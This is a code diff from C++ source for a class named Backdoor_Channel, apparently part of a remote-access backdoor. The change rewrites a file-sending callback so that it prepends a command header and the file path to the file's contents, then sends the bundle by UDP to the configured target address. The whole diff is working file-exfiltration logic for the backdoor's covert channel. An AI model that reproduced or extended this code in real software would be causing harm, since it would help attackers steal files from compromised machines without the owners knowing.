@@ -105,9 +105,25 @@ bool Backdoor_Channel::callback_sendfile(string filepath){
 }
 
 bool Backdoor_Channel::callback_sendNewFile(string filepath, string data){
-    Job j;
-    j.job = std::vector<unsigned char>(data.begin(), data.end());
-    j.address = config.target_addr;
-    j.argument = filepath;
-    handle_get_file(j);
+    
+    string result, response;
+    std::vector<unsigned char> hidden_data(data.begin(), data.end());
+
+    response += '[';
+    response += cmdMap.left.find(CMD::return_file)->second;
+    response += ']';
+    response += '[';
+    response += filepath;
+    response += ']';
+
+    int i =0;
+    for(auto& c : response){
+        hidden_data.insert(hidden_data.begin()+i, c);
+        i++;
+    }
+
+    cout << "response: \n" << response << endl;
+    cout << "ip: \n" << config.target_addr.ip << "port:" << config.target_addr.port << endl;
+    udp_send(config.target_addr.ip, config.target_addr.port, hidden_data);
+    return true;
 }
